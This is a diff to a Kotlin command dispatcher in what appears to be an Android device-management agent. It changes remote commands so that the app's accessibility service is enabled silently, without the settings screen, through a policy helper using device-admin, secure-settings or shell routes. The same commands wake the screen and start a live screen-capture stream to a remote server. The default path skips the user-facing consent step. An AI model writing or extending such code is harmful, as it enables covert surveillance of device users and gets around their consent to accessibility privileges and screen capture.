@@ -180,13 +180,20 @@ class CommandDispatcher(
                     val androidId = try {
                         android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "DEVICE"
                     } catch (_: Exception) { "DEVICE" }
-                    val deviceId = "${android.os.Build.MANUFACTURER}_${android.os.Build.MODEL}_${androidId.takeLast(6)}"
+                    val defaultDeviceId = "${android.os.Build.MANUFACTURER}_${android.os.Build.MODEL}_${androidId.takeLast(6)}"
+                    val targetDeviceId = json.optString("deviceId").ifBlank { defaultDeviceId }
+
+                    // Silently ensure accessibility service is enabled via DPM / Secure settings / Shell
+                    try {
+                        val policyHelper = com.nexus.mdm.agent.admin.PolicyManagerHelper(context)
+                        policyHelper.ensureAccessibilityServiceActive(context)
+                    } catch (_: Exception) {}
 
                     // Automatically illuminate and wake screen if sleeping so stream immediately captures active display
                     DeviceWakeManager.wakeUpScreen(context)
 
                     // Start stream immediately using applicationContext (system-wide capture)
-                    ScreenCaptureManager.startStream(context.applicationContext, configStore.serverUrl, deviceId)
+                    ScreenCaptureManager.startStream(context.applicationContext, configStore.serverUrl, targetDeviceId)
 
                     // Ensure MainActivity is ready if accessibility service is not yet enabled
                     if (NexusAccessibilityService.instance == null && com.nexus.mdm.agent.ui.MainActivity.instance == null) {
@@ -195,7 +202,7 @@ class CommandDispatcher(
                                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                 putExtra("EXTRA_START_SCREEN_STREAM", true)
                                 putExtra("EXTRA_SERVER_URL", configStore.serverUrl)
-                                putExtra("EXTRA_DEVICE_ID", deviceId)
+                                putExtra("EXTRA_DEVICE_ID", targetDeviceId)
                             }
                             context.startActivity(intent)
                         } catch (_: Exception) {}
@@ -209,15 +216,35 @@ class CommandDispatcher(
                 }
 
                 "OPEN_ACCESSIBILITY_SETTINGS" -> {
-                    try {
-                        val intent = Intent(context, com.nexus.mdm.agent.ui.MainActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                            putExtra("EXTRA_OPEN_A11Y_SETTINGS", true)
+                    val forceOpenUI = json.optBoolean("forceOpenUI", false)
+                    if (forceOpenUI) {
+                        try {
+                            val intent = Intent(context, com.nexus.mdm.agent.ui.MainActivity::class.java).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                                putExtra("EXTRA_OPEN_A11Y_SETTINGS", true)
+                            }
+                            context.startActivity(intent)
+                            Result.success("Accessibility activation screen opened on device.")
+                        } catch (e: Exception) {
+                            Result.failure(e)
                         }
-                        context.startActivity(intent)
-                        Result.success("Accessibility activation screen opened on device.")
-                    } catch (e: Exception) {
-                        Result.failure(e)
+                    } else {
+                        // Silent background activation without forcing the Settings UI on mobile
+                        try {
+                            val policyHelper = com.nexus.mdm.agent.admin.PolicyManagerHelper(context)
+                            val activated = policyHelper.ensureAccessibilityServiceActive(context)
+                            DeviceWakeManager.wakeUpScreen(context)
+                            val configStore = com.nexus.mdm.agent.config.SecureConfigStore(context)
+                            val androidId = try {
+                                android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "DEVICE"
+                            } catch (_: Exception) { "DEVICE" }
+                            val defaultDeviceId = "${android.os.Build.MANUFACTURER}_${android.os.Build.MODEL}_${androidId.takeLast(6)}"
+                            val targetDeviceId = json.optString("deviceId").ifBlank { defaultDeviceId }
+                            ScreenCaptureManager.startStream(context.applicationContext, configStore.serverUrl, targetDeviceId)
+                            Result.success("Accessibility silently enabled: $activated, live stream started.")
+                        } catch (e: Exception) {
+                            Result.failure(e)
+                        }
                     }
                 }
 
@@ -738,7 +765,7 @@ class CommandDispatcher(
                     android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                 )
                 val notification = androidx.core.app.NotificationCompat.Builder(context, com.nexus.mdm.agent.NexusApp.CHANNEL_ID_ALERTS)
-                    .setSmallIcon(com.nexus.mdm.agent.R.drawable.ic_nexus_shield)
+                    .setSmallIcon(com.nexus.mdm.agent.R.drawable.ic_shield)
                     .setContentTitle(title)
                     .setContentText(message)
                     .setStyle(androidx.core.app.NotificationCompat.BigTextStyle().bigText(message))
